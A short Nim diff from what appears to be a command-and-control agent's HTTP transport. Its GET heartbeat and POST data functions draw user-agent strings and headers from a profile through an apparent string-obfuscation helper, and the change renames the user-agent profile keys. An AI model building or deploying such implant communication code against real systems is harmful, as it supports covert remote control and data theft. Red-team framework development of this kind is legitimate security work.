@@ -4,7 +4,7 @@ import ../../common/[types, utils, profile]
 
 proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string = 
 
-    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("agent.user-agent")))
+    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("http-get.user-agent")))
     var heartbeatString: string
 
     # Apply data transformation to the heartbeat bytes
@@ -85,7 +85,7 @@ proc httpGet*(ctx: AgentCtx, heartbeat: seq[byte]): string =
 
 proc httpPost*(ctx: AgentCtx, data: seq[byte]): bool {.discardable.} = 
     
-    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("agent.user-agent")))
+    let client = newAsyncHttpClient(userAgent = ctx.profile.getString(protect("http-post.user-agent")))
 
     # Define request headers, as defined in profile
     for header, value in ctx.profile.getTable(protect("http-post.agent.headers")): 
